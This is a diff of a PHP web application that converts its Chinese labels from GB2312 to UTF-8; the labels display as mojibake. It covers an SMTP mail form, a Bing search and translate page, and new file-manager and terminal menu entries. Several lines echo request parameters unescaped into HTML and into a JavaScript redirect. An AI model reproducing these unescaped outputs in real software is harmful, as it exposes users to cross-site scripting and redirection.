                 <td align="center" width="80%">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7931,7 +9559,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center">
-                        SMTP¶Ë¿Ú£º
+                        SMTPç«¯å£ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7940,7 +9568,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center">
-                        SMTPêÇ³Æ£º
+                        SMTPæ˜µç§°ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7949,7 +9577,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center">
-                        SMTPµØÖ·£º
+                        SMTPåœ°å€ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7958,7 +9586,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center">
-                        SMTPÃÜÂë£º
+                        SMTPå¯†ç ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7975,7 +9603,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
                 <td align="left">
-                        &nbsp³­ËÍ·½µØÖ·ĞÅÏ¢£º
+                        &nbspæŠ„é€æ–¹åœ°å€ä¿¡æ¯ï¼š
                 </td>
         </tr>   
 </table>
@@ -7983,7 +9611,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <table width="95%" height="70" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr>
                 <td align="center" width="20%">
-                        ³­·½µØÖ·£º
+                        æŠ„æ–¹åœ°å€ï¼š
                 </td>
                 <td align="center" width="80%">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -7992,7 +9620,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center">
-                        ÃÜ³­µØÖ·£º
+                        å¯†æŠ„åœ°å€ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -8009,14 +9637,14 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 <table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
                 <td align="left">
-                        &nbspÓÊ¼şÏêÏ¸ÄÚÈİ£º
+                        &nbspé‚®ä»¶è¯¦ç»†å†…å®¹ï¼š
                 </td>
         </tr>   
 </table>
 <table width="95%" height="170" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr>
                 <td align="center" width="20%" height="40">
-                        ÓÊ¼şÖ÷Ìâ£º
+                        é‚®ä»¶ä¸»é¢˜ï¼š
                 </td>
                 <td align="center" width="80%">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
@@ -8025,17 +9653,17 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
         <tr>
                 <td align="center" height="40">
-                        ÑéÖ¤Âë£º
+                        éªŒè¯ç ï¼š
                 </td>
                 <td align="center">
                         <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
  style="width:80%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="4" onKeyUp="value=value.replace(/[^0-9,]/g,'')" value="" />
-                        &nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="13" src="?api=checkcode" border="0"></a>
+                        &nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="13" src="?api=checkcode" border="0"></a>
                 </td>
         </tr>   
         <tr>
                 <td align="center" valign="top">
-                        ÓÊ¼şÄÚÈİ£º
+                        é‚®ä»¶å†…å®¹ï¼š
                 </td>
                 <td align="center" width="80%">
                 <?php 
@@ -8062,11 +9690,11 @@ function changeimg()
         <tr class="tdtbg" height="35" valign="center">
                 <td align="center" valign="center" id="google">
                         <form action="<?php echo ScriptPath();?>?api=smtp&action=createmail&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="smtp">
-                        &nbsp·şÎñÆ÷£º<input type="text" class="text" name="server" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
-                        &nbsp¶Ë¿Ú£º<input type="text" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspæœåŠ¡å™¨ï¼š<input type="text" class="text" name="server" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
+                        &nbspç«¯å£ï¼š<input type="text" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -8099,16 +9727,16 @@ if (trim(request('action')) == "tts"){
     	header("Content-Disposition: attachment; filename=".trim(time()).".wav");	
     }
     $bing_search = new bing_class();
-    print_r($bing_search->bingtts(trim(request('content')),trim(request('lang'))));//"Web,ÍøÒ³|News,ĞÂÎÅ|Image,Í¼Æ¬";
+    print_r($bing_search->bingtts(trim(request('content')),trim(request('lang'))));//"Web,ç½‘é¡µ|News,æ–°é—»|Image,å›¾ç‰‡";
     exit;
 }else{
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 }
 
 //echo $_COOKIE["X3193"]['global'][$iplimiter]['verify']['result'].$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];
 //echo trim($_SERVER["HTTP_REFERER"]).'kkk';
 
-// ÆôÓÃ·­Òë
+// å¯ç”¨ç¿»è¯‘
 if (trim(request('transfrom')) != "")
         $Sources = "Translation";
 elseif (trim(request('Sources')) != "")
@@ -8125,30 +9753,30 @@ $style = new css();
 $style->ico();
 
 if (trim(request('api')) == "" && trim(request('Query')) == "" && $Sources != "News" && !is_wap())
-	$query = ("ÊÔÍæÓÎÏ·×¬Ç®");
+	$query = ("è¯•ç©æ¸¸æˆèµšé’±");
 elseif ($Sources == "News" && trim(request('Query')) == "")
 	$query = (date('Y').date('m').date('d'));
 elseif (trim(request('api')) == "discuz" && trim(request('Query')) == "" && !is_wap())
-	$query = ("ÊÔÍæÓÎÏ·×¬Ç®");
+	$query = ("è¯•ç©æ¸¸æˆèµšé’±");
 elseif(trim(request('cento'))=='360chrom')
-	$query = iconv('utf-8','gb2312',trim(request('Query')));
+	$query = (trim(request('Query')));
 else
 	$query = trim(request('Query'));
         
 if (trim($_SERVER['QUERY_STRING']) == "")
-        $style->title("X3193 - ".formatchar("ÍøÂç"));
+        $style->title("X3193 - ".("ç½‘ç»œ"));
 elseif ($query != "")
-        $style->title("X3193 - ".formatchar("ËÑË÷ -> ".$query));
+        $style->title("X3193 - ".("æœç´¢ -> ".$query));
 else
-        $style->title("X3193 - ".formatchar("ËÑË÷"));
+        $style->title("X3193 - ".("æœç´¢"));
         
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ        
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ        
 ?>
 
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('api')) == "" && trim(request('Query')) == "" && !is_wap())
         $pagesize = 50;
 elseif (trim(request('api')) == "bing" && $Sources == "News")
@@ -8204,9 +9832,9 @@ switch (trim(request('action'))) {  // case start
                 <td align="right" style="border:0">             
                         <?php  
                         	 IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|ÓÎÏ·|ÊÓÆµ|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|æ¸¸æˆ|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|ÊÓÆµ",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯",$skincolor);
                         ?>
                 </td>           
         </tr>
@@ -8216,26 +9844,26 @@ switch (trim(request('action'))) {  // case start
         <tr>
                 <td align="center" height="35" class="tdtbg" valign="middle">
                         <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:90px;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>>
-                        ÍøÒ³<input type="radio" name="Sources" value="web" <?php  if ($Sources=="web") echo 'checked'; elseif ($Sources=="") echo 'checked'; ?>> 
-                        ĞÂÎÅ<input type="radio" name="Sources" value="news" <?php if ($Sources=="news") echo 'checked'; ?>> 
-                        Í¼Æ¬<input type="radio" name="Sources" value="image" <?php if ($Sources=="image") echo 'checked'; ?>> 
-                        ÊÓÆµ<input type="radio" name="Sources" value="video" <?php if ($Sources=="video")  echo 'checked'; ?>> 
-                        ÊÖ»ú<input type="radio" name="Sources" value="MobileWeb" <?php if ($Sources=="MobileWeb")  echo 'checked'; ?>> 
+                        ç½‘é¡µ<input type="radio" name="Sources" value="web" <?php  if ($Sources=="web") echo 'checked'; elseif ($Sources=="") echo 'checked'; ?>> 
+                        æ–°é—»<input type="radio" name="Sources" value="news" <?php if ($Sources=="news") echo 'checked'; ?>> 
+                        å›¾ç‰‡<input type="radio" name="Sources" value="image" <?php if ($Sources=="image") echo 'checked'; ?>> 
+                        è§†é¢‘<input type="radio" name="Sources" value="video" <?php if ($Sources=="video")  echo 'checked'; ?>> 
+                        æ‰‹æœº<input type="radio" name="Sources" value="MobileWeb" <?php if ($Sources=="MobileWeb")  echo 'checked'; ?>> 
                         <noscript>
-                        µç»°<input type="radio" name="Sources" value="phonebook" <?php if ($Sources=="phonebook") ?>checked onclick="vbscript:getphone()"> 
-                        ÎÊ´ğ<input type="radio" name="Sources" value="instantanswer" <?php if ($Sources=="InstantAnswer") ?>checked> 
+                        ç”µè¯<input type="radio" name="Sources" value="phonebook" <?php if ($Sources=="phonebook") ?>checked onclick="vbscript:getphone()"> 
+                        é—®ç­”<input type="radio" name="Sources" value="instantanswer" <?php if ($Sources=="InstantAnswer") ?>checked> 
                         </noscript>
                         <SELECT name="transfrom" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:71px;height:16px;font-size:12px">
-                        <OPTION VALUE="">Ô´ÓïÖÖ</OPTION>
+                        <OPTION VALUE="">æºè¯­ç§</OPTION>
                         <?php 
-                        $langfrom = "Ar,Arabic|zh-CHS,¼òÌåÖĞÎÄ|zh-CHT,·±ówÖĞÎÄ|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
+                        $langfrom = "Ar,Arabic|zh-CHS,ç®€ä½“ä¸­æ–‡|zh-CHT,ç¹é«”ä¸­æ–‡|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
                         for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                         ?>
                                 <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['transfrom']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1));?></OPTION>
                         <?php 
                         }
                         ?>
-                        <OPTION VALUE="">²»Ñ¡Ôñ...</OPTION>
+                        <OPTION VALUE="">ä¸é€‰æ‹©...</OPTION>
                         </SELECT>
                         <SELECT name="market" size="1" <?php  $style->selectarea("#f9f9f9","") ?> style="width:175px;height:16px;font-size:12px">
                         <?php 
@@ -8274,9 +9902,9 @@ switch (trim(request('action'))) {  // case start
                 <td align="right" style="<?php $style->selcolor($skincolor,'tdbg');?>">             
                         <?php  
                         	 IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|ÓÎÏ·|ÊÓÆµ|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|æ¸¸æˆ|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|ÊÓÆµ",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯",$skincolor);
                   if (stripos($_SERVER['SERVER_NAME'],'.') == false){
                                 $zone = $_SERVER['SERVER_NAME'];
                                 $subzone = "";
@@ -8321,11 +9949,11 @@ else{
         <tr class="">
                 <td align="center" height="60" valign="middle" id='tr1'>
                					<input type="hidden" class="text" name="api" value="bing" size="1"> 
-                        <input class="input" name="Query" id="Query" border="0" value="<?php  echo $query; ?>" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:200px;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> x-webkit-speech>
+                        <input class="input" name="Query" id="Query" border="0" value="<?php  echo $query; ?>" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:200px;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> type="text"  x-webkit-speech x-webkit-grammar="builtin:search" />
 												<SELECT class="sotoolbar select" name="Sources" border="0" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px;">
                         <?php 
                					$bing_search = new bing_class();
-               					$langfrom = $bing_search->bingsearchtype();//"Web,ÍøÒ³|News,ĞÂÎÅ|Image,Í¼Æ¬";
+               					$langfrom = $bing_search->bingsearchtype();//"Web,ç½‘é¡µ|News,æ–°é—»|Image,å›¾ç‰‡";
                         for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                         ?>
                                 <OPTION class="option" style="padding-top:30px;height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==0? '#ffffff':'';?>;" VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['Sources']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1))?></OPTION>
@@ -8356,7 +9984,7 @@ else{
                        	if(trim(request('Sources'))=='Translate'){
                        	?>	
                         <SELECT name="tolang" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
-                        <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==0? '#ffffff':'';?>;" VALUE="multi" <?php  if (trim($_GET['tolang']) == '') echo 'selected';?>>ÓïÑÔ</OPTION>
+                        <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==0? '#ffffff':'';?>;" VALUE="multi" <?php  if (trim($_GET['tolang']) == '') echo 'selected';?>>è¯­è¨€</OPTION>
                         <?php 
                         $bing_search = new bing_class();
                					$langfrom = $bing_search->bingsearchcountrycode();
@@ -8407,26 +10035,26 @@ else{
                 if ($query != ""){ // query if start 
                         if (strripos($query,"\\") && $_POST['Query']!=''){
                         		if(!is_wap()){
-                                AlertBack("¹Ø¼ü´Ê²»ÄÜ°üº¬ÌØÊâ×Ö·û£¡" , 1);
+                                AlertBack("å…³é”®è¯ä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼" , 1);
                             }else{
                             
                             }  
                         }
                         elseif (strripos($query,"\\") && $_GET['Query']!=""){
                         		if(!is_wap()){                        	
-                                AlertBack("¹Ø¼ü´Ê²»ÄÜ°üº¬ÌØÊâ×Ö·û£¡" , 2);
+                                AlertBack("å…³é”®è¯ä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼" , 2);
                             }else{
                 ?>
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" style="<?php $style->selcolor($skincolor,'tdtbg');?>">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                 <td align="center" id="result">
-											¹Ø¼ü´Ê²»ÄÜ°üº¬ÌØÊâ×Ö·û£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>È¡Ïû</a>
+											å…³é”®è¯ä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>å–æ¶ˆ</a>
                 </td>
         </tr>  
 </table> 
@@ -8448,7 +10076,7 @@ else{
                         if (0){
                                 $xmlstr = '<?php xml version="1.0" encoding="gb2312" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>x3193</SearchTerms></Query><web:Web xmlns:web="http://schemas.microsoft.com/LiveSearch/2008/04/XML/web"><web:Total>193</web:Total><web:Offset>2</web:Offset><web:Results>';
                                 for($i=1;$i<=70;$i++){
-                                        $xmlstr = $xmlstr."<web:WebResult><web:Title>ÖĞ¹ú°ÙĞÕĞÂ²Æ¸»Íø_µç×ÓÔÓÖ¾ÆµµÀ_»ã¼¯¾«²ÊÃâ·Ñµç×ÓÔÓÖ¾</web:Title><web:Description>Î÷°²¾ÆµêÍø Äş²¨µÚÒ»Õ¾_ µç×ÓÔÓÖ¾(e µç×ÓÔÓÖ¾ÏÂÔØ µç×ÓÔÓÖ¾ E¹º¿Í µç×ÓÔÓÖ¾-E ÓãÓÎ~µç×ÓÔÓ µÂÖİÂó¿Í ÓÅÖ®³ÇÔÓÖ¾ ÖĞÎÄÔÓÖ¾ ÁÄ³ÇÏû·ÑÍø »¥ÁªÍøÔÓÖ¾ ºÃÈË°ï ÖĞ¹ú±ãÃñµ¼º½ Îû¹şÔÓÖ¾ ¿©Ó´Å¶ - ¶¼À´ÔÓÖ¾°É ³±Á÷cosm sadasa erqwr X3193</web:Description><web:Url>http://zz.bxxcf.com/</web:Url><web:CacheUrl>http://cncc.bingj.com/cache.aspx?q=x3193&amp;d=4914134124266644&amp;mkt=zh-cn&amp;w=4b69a191,a73cd67e</web:CacheUrl><web:DisplayUrl>zz.bxxcf.com</web:DisplayUrl><web:DateTime>2009-12-05T01:55:20Z</web:DateTime></web:WebResult>";
+                                        $xmlstr = $xmlstr."<web:WebResult><web:Title>ä¸­å›½ç™¾å§“æ–°è´¢å¯Œç½‘_ç”µå­æ‚å¿—é¢‘é“_æ±‡é›†ç²¾å½©å…è´¹ç”µå­æ‚å¿—</web:Title><web:Description>è¥¿å®‰é…’åº—ç½‘ å®æ³¢ç¬¬ä¸€ç«™_ ç”µå­æ‚å¿—(e ç”µå­æ‚å¿—ä¸‹è½½ ç”µå­æ‚å¿— Eè´­å®¢ ç”µå­æ‚å¿—-E é±¼æ¸¸~ç”µå­æ‚ å¾·å·éº¦å®¢ ä¼˜ä¹‹åŸæ‚å¿— ä¸­æ–‡æ‚å¿— èŠåŸæ¶ˆè´¹ç½‘ äº’è”ç½‘æ‚å¿— å¥½äººå¸® ä¸­å›½ä¾¿æ°‘å¯¼èˆª å˜»å“ˆæ‚å¿— å’¯å“Ÿå“¦ - éƒ½æ¥æ‚å¿—å§ æ½®æµcosm sadasa erqwr X3193</web:Description><web:Url>http://zz.bxxcf.com/</web:Url><web:CacheUrl>http://cncc.bingj.com/cache.aspx?q=x3193&amp;d=4914134124266644&amp;mkt=zh-cn&amp;w=4b69a191,a73cd67e</web:CacheUrl><web:DisplayUrl>zz.bxxcf.com</web:DisplayUrl><web:DateTime>2009-12-05T01:55:20Z</web:DateTime></web:WebResult>";
                                 }
                                 $xmlstr = $xmlstr.'</web:Results></web:Web></SearchResponse>';
                         }       
@@ -8464,11 +10092,11 @@ else{
                         ?>      
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" style="<?php $style->selcolor($skincolor,'tdtbg');?>">
-                <td align="center"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                 <td align="center" id="result">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>                
@@ -8479,11 +10107,11 @@ else{
                         ?>
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" style="<?php $style->selcolor($skincolor,'tdtbg');?>">
-                <td align="center"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                 <td align="center" id="result">
-                Î´ËÑË÷µ½ÈÎºÎÊı¾İ£¬ÇëÓÅ»¯¼ìË÷´Ê¡£
+                æœªæœç´¢åˆ°ä»»ä½•æ•°æ®ï¼Œè¯·ä¼˜åŒ–æ£€ç´¢è¯ã€‚
                 </td>
         </tr>   
 </table>                        
@@ -8503,7 +10131,7 @@ else{
                         ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑË÷½á¹û : ¹² <?php  echo $searchresult['totalitem'];?> Ìõ,½öÏÔÊ¾Ç° 1000 Ìõ </td>
+                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœç´¢ç»“æœ : å…± <?php  echo $searchresult['totalitem'];?> æ¡,ä»…æ˜¾ç¤ºå‰ 1000 æ¡ </td>
         </tr>   
                         <?php                       
                         for($i=0; $i <= $searchresult['endid'];$i++){
@@ -8532,9 +10160,9 @@ else{
                         <table width="95%">
                                 <tr>
                                         <td align="center">
-                                               <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>" target=_blank><?php  echo formatchar("ËõÂÔ");?></a> 
-                                               <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("ÊÕ²Ø");?></a> 
-                                               <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("ÍøÊÕ");?></a>
+                                               <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>" target=_blank><?php  echo ("ç¼©ç•¥");?></a> 
+                                               <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo ("æ”¶è—");?></a> 
+                                               <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo ("ç½‘æ”¶");?></a>
                                         </td>   
                                 </tr>
                         </table>                        
@@ -8549,15 +10177,15 @@ else{
 
                         
                         ?>
-                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                         <?php 
-                        echo $page." Ò³".$sCrlf.' ';
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>Ê×Ò³</a> ";
+                        echo $page." é¡µ".$sCrlf.' ';
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>é¦–é¡µ</a> ";
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÏÂÒ»Ò³</a> ";
-        								echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=20&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>Ä©Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸‹ä¸€é¡µ</a> ";
